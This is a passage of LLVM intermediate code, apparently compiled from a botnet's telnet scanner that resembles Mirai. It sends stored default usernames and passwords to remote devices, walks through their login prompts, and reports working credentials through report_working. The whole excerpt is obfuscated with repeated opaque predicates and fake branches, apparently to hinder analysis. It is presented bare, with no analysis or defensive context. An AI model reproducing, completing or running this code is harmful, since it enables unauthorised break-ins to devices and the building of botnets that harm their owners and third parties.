  %1389 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1388, i32 0, i32 0
  %1390 = load %struct.scanner_auth*, %struct.scanner_auth** %1389, align 8
  %1391 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1390, i32 0, i32 4
  %1392 = load i8, i8* %1391, align 4
  %1393 = zext i8 %1392 to i64
  %1394 = call i64 @send(i32 %1382, i8* %1387, i64 %1393, i32 16384)
  %1395 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1396 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1395, i32 0, i32 1
  %1397 = load i32, i32* %1396, align 8
  %1398 = call i64 @send(i32 %1397, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %1399 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1400 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1399, i32 0, i32 3
  store i32 4, i32* %1400, align 8
  br label %1401

; <label>:1401:                                   ; preds = %1379, %1375
  br label %1819

; <label>:1402:                                   ; preds = %originalBBpart2286
  %1403 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1404 = call i32 @consume_pass_prompt(%struct.scanner_connection* %1403)
  store i32 %1404, i32* %41, align 4
  %1405 = icmp sgt i32 %1404, 0
  br i1 %1405, label %1406, label %1428

; <label>:1406:                                   ; preds = %1402
  %1407 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1408 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1407, i32 0, i32 1
  %1409 = load i32, i32* %1408, align 8
  %1410 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1411 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1410, i32 0, i32 0
  %1412 = load %struct.scanner_auth*, %struct.scanner_auth** %1411, align 8
  %1413 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1412, i32 0, i32 1
  %1414 = load i8*, i8** %1413, align 8
  %1415 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1416 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1415, i32 0, i32 0
  %1417 = load %struct.scanner_auth*, %struct.scanner_auth** %1416, align 8
  %1418 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1417, i32 0, i32 5
  %1419 = load i8, i8* %1418, align 1
  %1420 = zext i8 %1419 to i64
  %1421 = call i64 @send(i32 %1409, i8* %1414, i64 %1420, i32 16384)
  %1422 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1423 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1422, i32 0, i32 1
  %1424 = load i32, i32* %1423, align 8
  %1425 = call i64 @send(i32 %1424, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %1426 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1427 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1426, i32 0, i32 3
  store i32 5, i32* %1427, align 8
  br label %1428

; <label>:1428:                                   ; preds = %1406, %1402
  br label %1819

; <label>:1429:                                   ; preds = %originalBBpart2286
  %1430 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1431 = call i32 @consume_any_prompt(%struct.scanner_connection* %1430)
  store i32 %1431, i32* %41, align 4
  %1432 = icmp sgt i32 %1431, 0
  br i1 %1432, label %1433, label %1464

; <label>:1433:                                   ; preds = %1429
  %1434 = load i32, i32* @x.63
  %1435 = load i32, i32* @y.64
  %1436 = sub i32 %1434, 1
  %1437 = mul i32 %1434, %1436
  %1438 = urem i32 %1437, 2
  %1439 = icmp eq i32 %1438, 0
  %1440 = icmp slt i32 %1435, 10
  %1441 = or i1 %1439, %1440
  br i1 %1441, label %originalBB296, label %originalBB296alteredBB

originalBB296:                                    ; preds = %originalBB296alteredBB, %1433
  call void @table_unlock_val(i8 zeroext 5)
  %1442 = call i8* @table_retrieve_val(i32 5, i32* %43)
  store i8* %1442, i8** %42, align 8
  %1443 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1444 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1443, i32 0, i32 1
  %1445 = load i32, i32* %1444, align 8
  %1446 = load i8*, i8** %42, align 8
  %1447 = load i32, i32* %43, align 4
  %1448 = sext i32 %1447 to i64
  %1449 = call i64 @send(i32 %1445, i8* %1446, i64 %1448, i32 16384)
  %1450 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1451 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1450, i32 0, i32 1
  %1452 = load i32, i32* %1451, align 8
  %1453 = call i64 @send(i32 %1452, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %1454 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1455 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1454, i32 0, i32 3
  store i32 6, i32* %1455, align 8
  %1456 = load i32, i32* @x.63
  %1457 = load i32, i32* @y.64
  %1458 = sub i32 %1456, 1
  %1459 = mul i32 %1456, %1458
  %1460 = urem i32 %1459, 2
  %1461 = icmp eq i32 %1460, 0
  %1462 = icmp slt i32 %1457, 10
  %1463 = or i1 %1461, %1462
  br i1 %1463, label %originalBBpart2298, label %originalBB296alteredBB

originalBBpart2298:                               ; preds = %originalBB296
  br label %1464

; <label>:1464:                                   ; preds = %originalBBpart2298, %1429
  %1465 = load i32, i32* @x.63
  %1466 = load i32, i32* @y.64
  %1467 = sub i32 %1465, 1
  %1468 = mul i32 %1465, %1467
  %1469 = urem i32 %1468, 2
  %1470 = icmp eq i32 %1469, 0
  %1471 = icmp slt i32 %1466, 10
  %1472 = or i1 %1470, %1471
  br i1 %1472, label %originalBB300, label %originalBB300alteredBB

originalBB300:                                    ; preds = %originalBB300alteredBB, %1464
  %1473 = load i32, i32* @x.63
  %1474 = load i32, i32* @y.64
  %1475 = sub i32 %1473, 1
  %1476 = mul i32 %1473, %1475
  %1477 = urem i32 %1476, 2
  %1478 = icmp eq i32 %1477, 0
  %1479 = icmp slt i32 %1474, 10
  %1480 = or i1 %1478, %1479
  br i1 %1480, label %originalBBpart2302, label %originalBB300alteredBB

originalBBpart2302:                               ; preds = %originalBB300
  br label %1819

; <label>:1481:                                   ; preds = %originalBBpart2286
  %1482 = load i32, i32* @x.63
  %1483 = load i32, i32* @y.64
  %1484 = sub i32 %1482, 1
  %1485 = mul i32 %1482, %1484
  %1486 = urem i32 %1485, 2
  %1487 = icmp eq i32 %1486, 0
  %1488 = icmp slt i32 %1483, 10
  %1489 = or i1 %1487, %1488
  br i1 %1489, label %originalBB304, label %originalBB304alteredBB

originalBB304:                                    ; preds = %originalBB304alteredBB, %1481
  %1490 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1491 = call i32 @consume_any_prompt(%struct.scanner_connection* %1490)
  store i32 %1491, i32* %41, align 4
  %1492 = icmp sgt i32 %1491, 0
  %1493 = load i32, i32* @x.63
  %1494 = load i32, i32* @y.64
  %1495 = sub i32 %1493, 1
  %1496 = mul i32 %1493, %1495
  %1497 = urem i32 %1496, 2
  %1498 = icmp eq i32 %1497, 0
  %1499 = icmp slt i32 %1494, 10
  %1500 = or i1 %1498, %1499
  br i1 %1500, label %originalBBpart2306, label %originalBB304alteredBB

originalBBpart2306:                               ; preds = %originalBB304
  br i1 %1492, label %1501, label %1532

; <label>:1501:                                   ; preds = %originalBBpart2306
  %1502 = load i32, i32* @x.63
  %1503 = load i32, i32* @y.64
  %1504 = sub i32 %1502, 1
  %1505 = mul i32 %1502, %1504
  %1506 = urem i32 %1505, 2
  %1507 = icmp eq i32 %1506, 0
  %1508 = icmp slt i32 %1503, 10
  %1509 = or i1 %1507, %1508
  br i1 %1509, label %originalBB308, label %originalBB308alteredBB

originalBB308:                                    ; preds = %originalBB308alteredBB, %1501
  call void @table_unlock_val(i8 zeroext 6)
  %1510 = call i8* @table_retrieve_val(i32 6, i32* %45)
  store i8* %1510, i8** %44, align 8
  %1511 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1512 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1511, i32 0, i32 1
  %1513 = load i32, i32* %1512, align 8
  %1514 = load i8*, i8** %44, align 8
  %1515 = load i32, i32* %45, align 4
  %1516 = sext i32 %1515 to i64
  %1517 = call i64 @send(i32 %1513, i8* %1514, i64 %1516, i32 16384)
  %1518 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1519 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1518, i32 0, i32 1
  %1520 = load i32, i32* %1519, align 8
  %1521 = call i64 @send(i32 %1520, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %1522 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1523 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1522, i32 0, i32 3
  store i32 7, i32* %1523, align 8
  %1524 = load i32, i32* @x.63
  %1525 = load i32, i32* @y.64
  %1526 = sub i32 %1524, 1
  %1527 = mul i32 %1524, %1526
  %1528 = urem i32 %1527, 2
  %1529 = icmp eq i32 %1528, 0
  %1530 = icmp slt i32 %1525, 10
  %1531 = or i1 %1529, %1530
  br i1 %1531, label %originalBBpart2310, label %originalBB308alteredBB

originalBBpart2310:                               ; preds = %originalBB308
  br label %1532

; <label>:1532:                                   ; preds = %originalBBpart2310, %originalBBpart2306
  %1533 = load i32, i32* @x.63
  %1534 = load i32, i32* @y.64
  %1535 = sub i32 %1533, 1
  %1536 = mul i32 %1533, %1535
  %1537 = urem i32 %1536, 2
  %1538 = icmp eq i32 %1537, 0
  %1539 = icmp slt i32 %1534, 10
  %1540 = or i1 %1538, %1539
  br i1 %1540, label %originalBB312, label %originalBB312alteredBB

originalBB312:                                    ; preds = %originalBB312alteredBB, %1532
  %1541 = load i32, i32* @x.63
  %1542 = load i32, i32* @y.64
  %1543 = sub i32 %1541, 1
  %1544 = mul i32 %1541, %1543
  %1545 = urem i32 %1544, 2
  %1546 = icmp eq i32 %1545, 0
  %1547 = icmp slt i32 %1542, 10
  %1548 = or i1 %1546, %1547
  br i1 %1548, label %originalBBpart2314, label %originalBB312alteredBB

originalBBpart2314:                               ; preds = %originalBB312
  br label %1819

; <label>:1549:                                   ; preds = %originalBBpart2286
  %1550 = load i32, i32* @x.63
  %1551 = load i32, i32* @y.64
  %1552 = sub i32 %1550, 1
  %1553 = mul i32 %1550, %1552
  %1554 = urem i32 %1553, 2
  %1555 = icmp eq i32 %1554, 0
  %1556 = icmp slt i32 %1551, 10
  %1557 = or i1 %1555, %1556
  br i1 %1557, label %originalBB316, label %originalBB316alteredBB

originalBB316:                                    ; preds = %originalBB316alteredBB, %1549
  %1558 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1559 = call i32 @consume_any_prompt(%struct.scanner_connection* %1558)
  store i32 %1559, i32* %41, align 4
  %1560 = icmp sgt i32 %1559, 0
  %1561 = load i32, i32* @x.63
  %1562 = load i32, i32* @y.64
  %1563 = sub i32 %1561, 1
  %1564 = mul i32 %1561, %1563
  %1565 = urem i32 %1564, 2
  %1566 = icmp eq i32 %1565, 0
  %1567 = icmp slt i32 %1562, 10
  %1568 = or i1 %1566, %1567
  br i1 %1568, label %originalBBpart2318, label %originalBB316alteredBB

originalBBpart2318:                               ; preds = %originalBB316
  br i1 %1560, label %1569, label %1584

; <label>:1569:                                   ; preds = %originalBBpart2318
  call void @table_unlock_val(i8 zeroext 4)
  %1570 = call i8* @table_retrieve_val(i32 4, i32* %47)
  store i8* %1570, i8** %46, align 8
  %1571 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1572 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1571, i32 0, i32 1
  %1573 = load i32, i32* %1572, align 8
  %1574 = load i8*, i8** %46, align 8
  %1575 = load i32, i32* %47, align 4
  %1576 = sext i32 %1575 to i64
  %1577 = call i64 @send(i32 %1573, i8* %1574, i64 %1576, i32 16384)
  %1578 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1579 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1578, i32 0, i32 1
  %1580 = load i32, i32* %1579, align 8
  %1581 = call i64 @send(i32 %1580, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %1582 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1583 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1582, i32 0, i32 3
  store i32 8, i32* %1583, align 8
  br label %1584

; <label>:1584:                                   ; preds = %1569, %originalBBpart2318
  %1585 = load i32, i32* @x.63
  %1586 = load i32, i32* @y.64
  %1587 = sub i32 %1585, 1
  %1588 = mul i32 %1585, %1587
  %1589 = urem i32 %1588, 2
  %1590 = icmp eq i32 %1589, 0
  %1591 = icmp slt i32 %1586, 10
  %1592 = or i1 %1590, %1591
  br i1 %1592, label %originalBB320, label %originalBB320alteredBB

originalBB320:                                    ; preds = %originalBB320alteredBB, %1584
  %1593 = load i32, i32* @x.63
  %1594 = load i32, i32* @y.64
  %1595 = sub i32 %1593, 1
  %1596 = mul i32 %1593, %1595
  %1597 = urem i32 %1596, 2
  %1598 = icmp eq i32 %1597, 0
  %1599 = icmp slt i32 %1594, 10
  %1600 = or i1 %1598, %1599
  br i1 %1600, label %originalBBpart2322, label %originalBB320alteredBB

originalBBpart2322:                               ; preds = %originalBB320
  br label %1819

; <label>:1601:                                   ; preds = %originalBBpart2286
  %1602 = load i32, i32* @x.63
  %1603 = load i32, i32* @y.64
  %1604 = sub i32 %1602, 1
  %1605 = mul i32 %1602, %1604
  %1606 = urem i32 %1605, 2
  %1607 = icmp eq i32 %1606, 0
  %1608 = icmp slt i32 %1603, 10
  %1609 = or i1 %1607, %1608
  br i1 %1609, label %originalBB324, label %originalBB324alteredBB

originalBB324:                                    ; preds = %originalBB324alteredBB, %1601
  %1610 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1611 = call i32 @consume_any_prompt(%struct.scanner_connection* %1610)
  store i32 %1611, i32* %41, align 4
  %1612 = icmp sgt i32 %1611, 0
  %1613 = load i32, i32* @x.63
  %1614 = load i32, i32* @y.64
  %1615 = sub i32 %1613, 1
  %1616 = mul i32 %1613, %1615
  %1617 = urem i32 %1616, 2
  %1618 = icmp eq i32 %1617, 0
  %1619 = icmp slt i32 %1614, 10
  %1620 = or i1 %1618, %1619
  br i1 %1620, label %originalBBpart2326, label %originalBB324alteredBB

originalBBpart2326:                               ; preds = %originalBB324
  br i1 %1612, label %1621, label %1652

; <label>:1621:                                   ; preds = %originalBBpart2326
  %1622 = load i32, i32* @x.63
  %1623 = load i32, i32* @y.64
  %1624 = sub i32 %1622, 1
  %1625 = mul i32 %1622, %1624
  %1626 = urem i32 %1625, 2
  %1627 = icmp eq i32 %1626, 0
  %1628 = icmp slt i32 %1623, 10
  %1629 = or i1 %1627, %1628
  br i1 %1629, label %originalBB328, label %originalBB328alteredBB

originalBB328:                                    ; preds = %originalBB328alteredBB, %1621
  call void @table_unlock_val(i8 zeroext 7)
  %1630 = call i8* @table_retrieve_val(i32 7, i32* %49)
  store i8* %1630, i8** %48, align 8
  %1631 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1632 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1631, i32 0, i32 1
  %1633 = load i32, i32* %1632, align 8
  %1634 = load i8*, i8** %48, align 8
  %1635 = load i32, i32* %49, align 4
  %1636 = sext i32 %1635 to i64
  %1637 = call i64 @send(i32 %1633, i8* %1634, i64 %1636, i32 16384)
  %1638 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1639 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1638, i32 0, i32 1
  %1640 = load i32, i32* %1639, align 8
  %1641 = call i64 @send(i32 %1640, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %1642 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1643 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1642, i32 0, i32 3
  store i32 9, i32* %1643, align 8
  %1644 = load i32, i32* @x.63
  %1645 = load i32, i32* @y.64
  %1646 = sub i32 %1644, 1
  %1647 = mul i32 %1644, %1646
  %1648 = urem i32 %1647, 2
  %1649 = icmp eq i32 %1648, 0
  %1650 = icmp slt i32 %1645, 10
  %1651 = or i1 %1649, %1650
  br i1 %1651, label %originalBBpart2330, label %originalBB328alteredBB

originalBBpart2330:                               ; preds = %originalBB328
  br label %1652

; <label>:1652:                                   ; preds = %originalBBpart2330, %originalBBpart2326
  br label %1819

; <label>:1653:                                   ; preds = %originalBBpart2286
  %1654 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1655 = call i32 @consume_any_prompt(%struct.scanner_connection* %1654)
  store i32 %1655, i32* %41, align 4
  %1656 = icmp sgt i32 %1655, 0
  br i1 %1656, label %1657, label %1688

; <label>:1657:                                   ; preds = %1653
  %1658 = load i32, i32* @x.63
  %1659 = load i32, i32* @y.64
  %1660 = sub i32 %1658, 1
  %1661 = mul i32 %1658, %1660
  %1662 = urem i32 %1661, 2
  %1663 = icmp eq i32 %1662, 0
  %1664 = icmp slt i32 %1659, 10
  %1665 = or i1 %1663, %1664
  br i1 %1665, label %originalBB332, label %originalBB332alteredBB

originalBB332:                                    ; preds = %originalBB332alteredBB, %1657
  call void @table_unlock_val(i8 zeroext 8)
  %1666 = call i8* @table_retrieve_val(i32 8, i32* %51)
  store i8* %1666, i8** %50, align 8
  %1667 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1668 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1667, i32 0, i32 1
  %1669 = load i32, i32* %1668, align 8
  %1670 = load i8*, i8** %50, align 8
  %1671 = load i32, i32* %51, align 4
  %1672 = sext i32 %1671 to i64
  %1673 = call i64 @send(i32 %1669, i8* %1670, i64 %1672, i32 16384)
  %1674 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1675 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1674, i32 0, i32 1
  %1676 = load i32, i32* %1675, align 8
  %1677 = call i64 @send(i32 %1676, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %1678 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1679 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1678, i32 0, i32 3
  store i32 10, i32* %1679, align 8
  %1680 = load i32, i32* @x.63
  %1681 = load i32, i32* @y.64
  %1682 = sub i32 %1680, 1
  %1683 = mul i32 %1680, %1682
  %1684 = urem i32 %1683, 2
  %1685 = icmp eq i32 %1684, 0
  %1686 = icmp slt i32 %1681, 10
  %1687 = or i1 %1685, %1686
  br i1 %1687, label %originalBBpart2334, label %originalBB332alteredBB

originalBBpart2334:                               ; preds = %originalBB332
  br label %1688

; <label>:1688:                                   ; preds = %originalBBpart2334, %1653
  br label %1819

; <label>:1689:                                   ; preds = %originalBBpart2286
  %1690 = load i32, i32* @x.63
  %1691 = load i32, i32* @y.64
  %1692 = sub i32 %1690, 1
  %1693 = mul i32 %1690, %1692
  %1694 = urem i32 %1693, 2
  %1695 = icmp eq i32 %1694, 0
  %1696 = icmp slt i32 %1691, 10
  %1697 = or i1 %1695, %1696
  br i1 %1697, label %originalBB336, label %originalBB336alteredBB

originalBB336:                                    ; preds = %originalBB336alteredBB, %1689
  %1698 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1699 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1698)
  store i32 %1699, i32* %41, align 4
  %1700 = load i32, i32* %41, align 4
  %1701 = icmp eq i32 %1700, -1
  %1702 = load i32, i32* @x.63
  %1703 = load i32, i32* @y.64
  %1704 = sub i32 %1702, 1
  %1705 = mul i32 %1702, %1704
  %1706 = urem i32 %1705, 2
  %1707 = icmp eq i32 %1706, 0
  %1708 = icmp slt i32 %1703, 10
  %1709 = or i1 %1707, %1708
  br i1 %1709, label %originalBBpart2338, label %originalBB336alteredBB

originalBBpart2338:                               ; preds = %originalBB336
  br i1 %1701, label %1710, label %1763

; <label>:1710:                                   ; preds = %originalBBpart2338
  %1711 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1712 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1711, i32 0, i32 1
  %1713 = load i32, i32* %1712, align 8
  %1714 = call i32 @close(i32 %1713)
  %1715 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1716 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1715, i32 0, i32 1
  store i32 -1, i32* %1716, align 8
  %1717 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1718 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1717, i32 0, i32 8
  %1719 = load i8, i8* %1718, align 8
  %1720 = add i8 %1719, 1
  store i8 %1720, i8* %1718, align 8
  %1721 = zext i8 %1720 to i32
  %1722 = icmp eq i32 %1721, 10
  br i1 %1722, label %1723, label %1744

; <label>:1723:                                   ; preds = %1710
  %1724 = load i32, i32* @x.63
  %1725 = load i32, i32* @y.64
  %1726 = sub i32 %1724, 1
  %1727 = mul i32 %1724, %1726
  %1728 = urem i32 %1727, 2
  %1729 = icmp eq i32 %1728, 0
  %1730 = icmp slt i32 %1725, 10
  %1731 = or i1 %1729, %1730
  br i1 %1731, label %originalBB340, label %originalBB340alteredBB

originalBB340:                                    ; preds = %originalBB340alteredBB, %1723
  %1732 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1733 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1732, i32 0, i32 8
  store i8 0, i8* %1733, align 8
  %1734 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1735 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1734, i32 0, i32 3
  store i32 0, i32* %1735, align 8
  %1736 = load i32, i32* @x.63
  %1737 = load i32, i32* @y.64
  %1738 = sub i32 %1736, 1
  %1739 = mul i32 %1736, %1738
  %1740 = urem i32 %1739, 2
  %1741 = icmp eq i32 %1740, 0
  %1742 = icmp slt i32 %1737, 10
  %1743 = or i1 %1741, %1742
  br i1 %1743, label %originalBBpart2342, label %originalBB340alteredBB

originalBBpart2342:                               ; preds = %originalBB340
  br label %1746

; <label>:1744:                                   ; preds = %1710
  %1745 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  call void @setup_connection(%struct.scanner_connection* %1745)
  br label %1746

; <label>:1746:                                   ; preds = %1744, %originalBBpart2342
  %1747 = load i32, i32* @x.63
  %1748 = load i32, i32* @y.64
  %1749 = sub i32 %1747, 1
  %1750 = mul i32 %1747, %1749
  %1751 = urem i32 %1750, 2
  %1752 = icmp eq i32 %1751, 0
  %1753 = icmp slt i32 %1748, 10
  %1754 = or i1 %1752, %1753
  br i1 %1754, label %originalBB344, label %originalBB344alteredBB

originalBB344:                                    ; preds = %originalBB344alteredBB, %1746
  %1755 = load i32, i32* @x.63
  %1756 = load i32, i32* @y.64
  %1757 = sub i32 %1755, 1
  %1758 = mul i32 %1755, %1757
  %1759 = urem i32 %1758, 2
  %1760 = icmp eq i32 %1759, 0
  %1761 = icmp slt i32 %1756, 10
  %1762 = or i1 %1760, %1761
  br i1 %1762, label %originalBBpart2346, label %originalBB344alteredBB

originalBBpart2346:                               ; preds = %originalBB344
  br label %1801

; <label>:1763:                                   ; preds = %originalBBpart2338
  %1764 = load i32, i32* %41, align 4
  %1765 = icmp sgt i32 %1764, 0
  br i1 %1765, label %1766, label %1784

; <label>:1766:                                   ; preds = %1763
  %1767 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1768 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1767, i32 0, i32 4
  %1769 = load i32, i32* %1768, align 4
  %1770 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1771 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1770, i32 0, i32 5
  %1772 = load i16, i16* %1771, align 8
  %1773 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1774 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1773, i32 0, i32 0
  %1775 = load %struct.scanner_auth*, %struct.scanner_auth** %1774, align 8
  call void @report_working(i32 %1769, i16 zeroext %1772, %struct.scanner_auth* %1775)
  %1776 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1777 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1776, i32 0, i32 1
  %1778 = load i32, i32* %1777, align 8
  %1779 = call i32 @close(i32 %1778)
  %1780 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1781 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1780, i32 0, i32 1
  store i32 -1, i32* %1781, align 8
  %1782 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1783 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1782, i32 0, i32 3
  store i32 0, i32* %1783, align 8
  br label %1784

; <label>:1784:                                   ; preds = %1766, %1763
  %1785 = load i32, i32* @x.63
  %1786 = load i32, i32* @y.64
  %1787 = sub i32 %1785, 1
  %1788 = mul i32 %1785, %1787
  %1789 = urem i32 %1788, 2
  %1790 = icmp eq i32 %1789, 0
  %1791 = icmp slt i32 %1786, 10
  %1792 = or i1 %1790, %1791
  br i1 %1792, label %originalBB348, label %originalBB348alteredBB

originalBB348:                                    ; preds = %originalBB348alteredBB, %1784
  %1793 = load i32, i32* @x.63
  %1794 = load i32, i32* @y.64
  %1795 = sub i32 %1793, 1
  %1796 = mul i32 %1793, %1795
  %1797 = urem i32 %1796, 2
  %1798 = icmp eq i32 %1797, 0
  %1799 = icmp slt i32 %1794, 10
  %1800 = or i1 %1798, %1799
  br i1 %1800, label %originalBBpart2350, label %originalBB348alteredBB

originalBBpart2350:                               ; preds = %originalBB348
  br label %1801

; <label>:1801:                                   ; preds = %originalBBpart2350, %originalBBpart2346
  %1802 = load i32, i32* @x.63
  %1803 = load i32, i32* @y.64
  %1804 = sub i32 %1802, 1
  %1805 = mul i32 %1802, %1804
  %1806 = urem i32 %1805, 2
  %1807 = icmp eq i32 %1806, 0
  %1808 = icmp slt i32 %1803, 10
  %1809 = or i1 %1807, %1808
  br i1 %1809, label %originalBB352, label %originalBB352alteredBB

originalBB352:                                    ; preds = %originalBB352alteredBB, %1801
  %1810 = load i32, i32* @x.63
  %1811 = load i32, i32* @y.64
  %1812 = sub i32 %1810, 1
  %1813 = mul i32 %1810, %1812
  %1814 = urem i32 %1813, 2
  %1815 = icmp eq i32 %1814, 0
  %1816 = icmp slt i32 %1811, 10
  %1817 = or i1 %1815, %1816
  br i1 %1817, label %originalBBpart2354, label %originalBB352alteredBB

originalBBpart2354:                               ; preds = %originalBB352
  br label %1819

; <label>:1818:                                   ; preds = %originalBBpart2286
  store i32 0, i32* %41, align 4
  br label %1819

; <label>:1819:                                   ; preds = %1818, %originalBBpart2354, %1688, %1652, %originalBBpart2322, %originalBBpart2314, %originalBBpart2302, %1428, %1401, %originalBBpart2294
  %1820 = load i32, i32* %41, align 4
  %1821 = icmp eq i32 %1820, 0
  br i1 %1821, label %1822, label %1839

; <label>:1822:                                   ; preds = %1819
  %1823 = load i32, i32* @x.63
  %1824 = load i32, i32* @y.64
  %1825 = sub i32 %1823, 1
  %1826 = mul i32 %1823, %1825
  %1827 = urem i32 %1826, 2
  %1828 = icmp eq i32 %1827, 0
  %1829 = icmp slt i32 %1824, 10
  %1830 = or i1 %1828, %1829
  br i1 %1830, label %originalBB356, label %originalBB356alteredBB

originalBB356:                                    ; preds = %originalBB356alteredBB, %1822
  %1831 = load i32, i32* @x.63
  %1832 = load i32, i32* @y.64
  %1833 = sub i32 %1831, 1
  %1834 = mul i32 %1831, %1833
  %1835 = urem i32 %1834, 2
  %1836 = icmp eq i32 %1835, 0
  %1837 = icmp slt i32 %1832, 10
  %1838 = or i1 %1836, %1837
  br i1 %1838, label %originalBBpart2358, label %originalBB356alteredBB

originalBBpart2358:                               ; preds = %originalBB356
  br label %1869

; <label>:1839:                                   ; preds = %1819
  %1840 = load i32, i32* %41, align 4
  %1841 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1842 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1841, i32 0, i32 6
  %1843 = load i32, i32* %1842, align 4
  %1844 = icmp sgt i32 %1840, %1843
  br i1 %1844, label %1845, label %1849

; <label>:1845:                                   ; preds = %1839
  %1846 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %1847 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1846, i32 0, i32 6
  %1848 = load i32, i32* %1847, align 4
  store i32 %1848, i32* %41, align 4
  br label %1849

; <label>:1849:                                   ; preds = %1845, %1839
  %1850 = load i32, i32* %41, align 4
